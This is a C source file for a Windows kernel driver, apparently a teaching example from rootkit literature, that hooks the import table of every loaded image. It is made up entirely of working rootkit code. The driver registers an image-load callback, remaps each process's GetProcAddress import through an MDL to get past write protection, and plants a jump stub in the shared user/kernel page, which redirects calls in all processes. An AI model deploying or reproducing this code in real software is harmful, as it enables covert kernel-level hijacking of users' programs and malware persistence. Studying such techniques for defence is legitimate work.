
#include "ntddk.h"
#include "ntimage.h"
#include "hybridhook.h"



NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, 
					 IN PUNICODE_STRING theRegistryPath)
{
	NTSTATUS ntStatus;
	gb_Hooked = FALSE; // We have not hooked yet

	ntStatus = PsSetLoadImageNotifyRoutine(MyImageLoadNotify);

    return ntStatus;
}

/////////////////////////////////////////////////////////
// MyImageLoadNotify gets called when an image is loaded
// into kernel or user space. At this point, you could 
// filter your hook based on ProcessId or on the name of
// of the image.
VOID MyImageLoadNotify(IN PUNICODE_STRING  FullImageName,
                       IN HANDLE  ProcessId, // Process where image is mapped
					   IN PIMAGE_INFO  ImageInfo)
{
//	UNICODE_STRING u_targetDLL;

	DbgPrint("Image name: %ws\n", FullImageName->Buffer);
	// Setup the name of the DLL to target
//	RtlInitUnicodeString(&u_targetDLL, L"\\WINDOWS\\system32\\kernel32.dll");

//	if (RtlCompareUnicodeString(FullImageName, &u_targetDLL, TRUE) == 0)
//	{
		HookImportsOfImage(ImageInfo->ImageBase, ProcessId);
//	}

}


NTSTATUS HookImportsOfImage(PIMAGE_DOS_HEADER image_addr, HANDLE h_proc)
{
	PIMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS pNTHeader;
	PIMAGE_IMPORT_DESCRIPTOR importDesc;
	PIMAGE_IMPORT_BY_NAME p_ibn;
	DWORD importsStartRVA;
	PDWORD pd_IAT, pd_INTO;
	int count, index;
	char *dll_name = NULL;
	char *pc_dlltar = "kernel32.dll";
	char *pc_fnctar = "GetProcAddress";
	PMDL  p_mdl;
	PDWORD MappedImTable;
	DWORD d_sharedM = 0x7ffe0800;
	DWORD d_sharedK = 0xffdf0800; 

	// Little detour
	unsigned char new_code[] = { 
		0x90,                          // NOP make INT 3 to see
		0xb8, 0xff, 0xff, 0xff, 0xff,  // mov eax, 0xffffffff
		0xff, 0xe0                     // jmp eax
	};
	
	dosHeader = (PIMAGE_DOS_HEADER) image_addr;

	pNTHeader = MakePtr( PIMAGE_NT_HEADERS, dosHeader,
								dosHeader->e_lfanew );
	
	// First, verify that the e_lfanew field gave us a reasonable
	// pointer, then verify the PE signature.
	if ( pNTHeader->Signature != IMAGE_NT_SIGNATURE )
		return STATUS_INVALID_IMAGE_FORMAT;

	importsStartRVA = pNTHeader->OptionalHeader.DataDirectory
							[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	if (!importsStartRVA)
		return STATUS_INVALID_IMAGE_FORMAT;

	importDesc = (PIMAGE_IMPORT_DESCRIPTOR) (importsStartRVA + (DWORD) dosHeader);

	for (count = 0; importDesc[count].Characteristics != 0; count++)
	{
		dll_name = (char*) (importDesc[count].Name + (DWORD) dosHeader);
				
		pd_IAT = (PDWORD)(((DWORD) dosHeader) + (DWORD)importDesc[count].FirstThunk);
		pd_INTO = (PDWORD)(((DWORD) dosHeader) + (DWORD)importDesc[count].OriginalFirstThunk);

		for (index = 0; pd_IAT[index] != 0; index++)
		{
			// If this is an import by ordinal the high
			// bit is set
			if ((pd_INTO[index] & IMAGE_ORDINAL_FLAG) != IMAGE_ORDINAL_FLAG)
			{
				p_ibn = (PIMAGE_IMPORT_BY_NAME)(pd_INTO[index]+((DWORD) dosHeader));
				if ((_stricmp(dll_name, pc_dlltar) == 0) && \
					(strcmp(p_ibn->Name, pc_fnctar) == 0))
				{
					//DbgPrint("Imports from DLL: %s", dll_name);
					//DbgPrint(" Name: %s Address: %x\n", p_ibn->Name, pd_IAT[index]);  	

					// Use the trick you already learned to map a different
					// virtual address to the same physical page so no
					// permission problems.
					//
					// Map the memory into our domain so we can change the permissions on the MDL
					p_mdl = MmCreateMdl(NULL, &pd_IAT[index], 4);
					if(!p_mdl)
						return STATUS_UNSUCCESSFUL;

					MmBuildMdlForNonPagedPool(p_mdl);

					// Change the flags of the MDL
					p_mdl->MdlFlags = p_mdl->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

					MappedImTable = MmMapLockedPages(p_mdl, KernelMode);
					
					if (!gb_Hooked)
					{
					    // Writing the raw opcodes to memory
						// used a kernel address that gets mapped
						// into the address space of all processes
						// thanks to Barnaby Jack
						RtlCopyMemory((PVOID)d_sharedK, new_code, 8);
						RtlCopyMemory((PVOID)(d_sharedK+2),(PVOID)&pd_IAT[index], 4);
						gb_Hooked = TRUE;
					}

					// Offset to the "new function"
					*MappedImTable = d_sharedM;

					// Free MDL
					MmUnmapLockedPages(MappedImTable, p_mdl);
					IoFreeMdl(p_mdl);

				}
			}
		}
	}
	return STATUS_SUCCESS;
}

